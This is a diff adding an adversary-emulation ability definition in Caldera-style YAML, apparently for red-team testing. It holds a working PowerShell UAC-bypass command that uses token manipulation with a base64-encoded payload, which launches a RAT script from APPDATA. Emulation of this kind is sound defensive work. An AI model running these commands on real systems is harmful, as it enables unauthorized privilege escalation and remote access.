@@ -1,0 +1,18 @@
+---
+
+- id: 1345bff7-6f26-43b2-a92a-9aabccdb3db0
+  name: 3.A.1 - Bypass User Account Control (T1088)
+  description: A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1088
+    name: Bypass User Account Control (T1088) via Access Token Manipulation (T1134)
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
+          Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7AHUAcABkAGEAdABlAA==" -Verbose
+        payload: Invoke-BypassUACTokenManipulation.ps1
+
+# Encoded command: Import-Module $env:APPDATA\update.ps1;update
